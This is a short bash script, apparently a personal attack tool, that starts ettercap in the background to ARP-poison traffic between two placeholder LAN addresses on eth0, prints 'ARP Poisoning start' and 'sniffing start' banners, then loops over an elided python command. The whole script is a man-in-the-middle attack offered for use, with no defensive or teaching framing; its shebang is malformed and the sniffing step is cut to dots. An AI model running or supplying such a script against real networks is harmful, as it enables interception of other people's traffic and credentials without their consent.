#/bin/bash
nohup ettercap -Tq -i eth0 -o -M ARP /192.168.x.x// /192.168.x.x// >/dev/null 2>&1 &
echo "=============ARP Poisoning start !!=============="
sleep 4
echo "================sniffing start !!================"
while true
do
  python .....
done
